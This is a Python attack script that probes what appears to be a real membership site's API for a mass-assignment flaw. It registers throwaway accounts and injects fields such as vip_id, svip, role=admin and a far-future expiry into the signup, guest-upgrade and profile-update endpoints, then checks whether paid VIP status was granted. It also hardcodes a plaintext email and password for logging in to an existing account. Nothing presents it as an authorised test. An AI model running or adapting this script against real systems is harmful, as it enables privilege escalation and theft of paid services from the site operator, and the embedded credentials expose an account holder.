# -*- coding: utf-8 -*-
"""会员等级注入攻击: signup/guest-upgrade/update 带 vip 字段 (批量赋值漏洞)"""

import urllib.request, urllib.parse, json, time, sys, ssl, random, string

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:250]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
res = []


def check_vip(tok, label):
    st, b = req("GET", "/api/user/info", headers={"Authorization": "Bearer " + tok})
    res.append({"t": label + "-info", "s": st, "b": b[:400]})
    log("VIP检查 %s: %s %s" % (label, st, b[:180].replace("\n", " ")))
    if st == 200:
        try:
            data = json.loads(b).get("data", {})
            if data.get("vip_id") and data["vip_id"] > 0:
                log(">>>>>>> VIP 生效!!! vip_id=%s %s" % (data["vip_id"], label))
        except Exception:
            pass
    return st, b


def rand_suffix():
    return "".join(random.choices(string.digits, k=6))


# 1. signup + 各种 vip 字段注入
log("=== signup 注入 ===")
extras = [
    {},
    {"vip_id": 4},
    {"vip_id": 4, "vip_level": 4, "svip": 1, "expiry_at": "2099-01-01 00:00:00"},
    {"vip_id": 1},
    {"vip_level": 4},
    {"group_id": 4},
    {"role": "admin"},
    {"is_vip": 1},
    {"vip": 1},
    {"member": 1},
]
for i, extra in enumerate(extras):
    suf = rand_suffix()
    data = {
        "username": "tester" + suf,
        "email": "%s@qq.com" % suf,
        "password": "Test1234!",
    }
    data.update(extra)
    st, b = req("POST", "/api/user/signup", data)
    res.append({"t": "signup-%d" % i, "s": st, "b": b[:300], "extra": str(extra)})
    log("signup[%d] %s: %s %s" % (i, extra, st, b[:110].replace("\n", " ")))
    tok = ""
    if st == 200:
        try:
            j = json.loads(b)
            tok = (
                j.get("signup_token")
                or j.get("access_token")
                or j.get("data", {}).get("access_token")
                or ""
            ).replace("bearer ", "")
        except Exception:
            pass
    if tok:
        check_vip(tok, "signup-%d" % i)
    time.sleep(0.5)

# 2. guest-upgrade 注入
log("=== guest-upgrade 注入 ===")
st, b = req("POST", "/api/user/guest-signup")
gt = ""
try:
    gj = json.loads(b)
    gt = (gj.get("access_token") or "").replace("bearer ", "")
    gcred = gj.get("guest_credential", "")
except Exception:
    gcred = ""
log("guest-signup: %s %s" % (st, b[:100]))
if gt:
    suf = rand_suffix()
    up_data = {
        "credential": gcred,
        "username": "up" + suf,
        "email": "up%s@qq.com" % suf,
        "password": "Test1234!",
        "vip_id": 4,
        "vip_level": 4,
        "svip": 1,
    }
    st2, b2 = req("POST", "/api/user/guest-upgrade", up_data)
    res.append({"t": "guestupgrade", "s": st2, "b": b2[:300]})
    log("guest-upgrade+VIP: %s %s" % (st2, b2[:130].replace("\n", " ")))
    if st2 == 200:
        try:
            tok2 = (json.loads(b2).get("access_token") or "").replace("bearer ", "")
        except Exception:
            tok2 = ""
        if tok2:
            check_vip(tok2, "guestupgrade")

# 3. update 接口注入 (带已有 token)
log("=== update 注入 ===")
st, body = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
time.sleep(1)
for method, path, data in [
    ("POST", "/api/user/update", {"vip_id": 4}),
    ("POST", "/api/user/info", {"vip_id": 4, "expiry_at": "2099-01-01 00:00:00"}),
    ("PUT", "/api/user/info", {"vip_id": 4}),
    ("PATCH", "/api/user/info", {"vip_id": 4}),
    ("POST", "/api/user/profile", {"vip_id": 4}),
    ("POST", "/api/user/settings", {"vip_id": 4}),
    ("POST", "/api/user/account", {"vip_id": 4}),
    ("POST", "/api/user", {"vip_id": 4}),
]:
    st, b = req(method, path, data)
    res.append({"t": "upd-%s%s" % (method, path), "s": st, "b": b[:250]})
    log("upd %s %s: %s %s" % (method, path, st, b[:100].replace("\n", " ")))
    time.sleep(0.4)
if tok:
    check_vip(tok, "after-update")

with open("vip_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("vip_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("vip inject shard%d done" % shard)
